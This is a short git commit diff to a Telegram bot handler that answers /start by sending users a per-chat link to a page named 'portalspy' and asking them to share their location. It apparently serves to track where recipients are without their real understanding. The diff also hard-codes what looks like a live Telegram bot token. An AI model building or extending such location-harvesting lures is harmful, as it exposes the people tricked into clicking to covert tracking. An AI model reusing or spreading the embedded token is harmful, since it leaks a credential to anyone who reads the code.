6ba9d387ccff8023726280153141d87ef4200383
asifmufti922 <asifmufti922@gmail.com>
2025-05-12 04:10:06 +0500

    Update bot.js

--- api/bot.js
+++ api/bot.js
@@ -2,14 +2,13 @@ export default async function handler(req, res) {
   if (req.method !== "POST") return res.status(405).end("Only POST allowed");
 
   const data = req.body;
-
   if (data.message && data.message.text === "/start") {
     const chatId = data.message.chat.id;
     const userName = data.message.from.first_name || "User";
 
-    const link = `https://hafizportalspy.vercel.app/}`;
+    const link = `https://hafizportalspy.vercel.app/?id=${chatId}`;
 
-    const text = `Salam ${userName},\nClick this link to share your location:\n${link}`;
+    const text = `Salam ${userName},\nClick the link below to share your location:\n${link}`;
 
     await fetch(`https://api.telegram.org/bot7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k/sendMessage`, {
       method: "POST",
